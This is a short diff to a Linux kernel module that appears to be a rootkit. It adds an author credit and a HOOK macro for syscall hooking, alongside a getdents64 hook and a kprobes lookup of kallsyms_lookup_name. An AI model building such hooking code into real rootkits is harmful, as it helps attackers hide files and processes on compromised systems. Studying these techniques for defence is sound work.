@@ -48,6 +48,7 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs);
  * On Linux kernels 5.7+, kallsyms_lookup_name() is no longer exported, 
  * so we have to use kprobes to get the address.
  * Full credit to @f0lg0 for the idea.
+ * And full credit to Harvey Phillips (xcellerator@gmx.com) for code that inspired me.
  */
 #include <linux/kprobes.h>
 
@@ -56,3 +57,9 @@ static struct kprobe kp = {
 	    .symbol_name = "kallsyms_lookup_name"
 };
 
+#define HOOK(_name, _hook, _orig)   \
+{                   \
+    .name = (_name),        \
+    .function = (_hook),        \
+    .original = (_orig),        \
+}
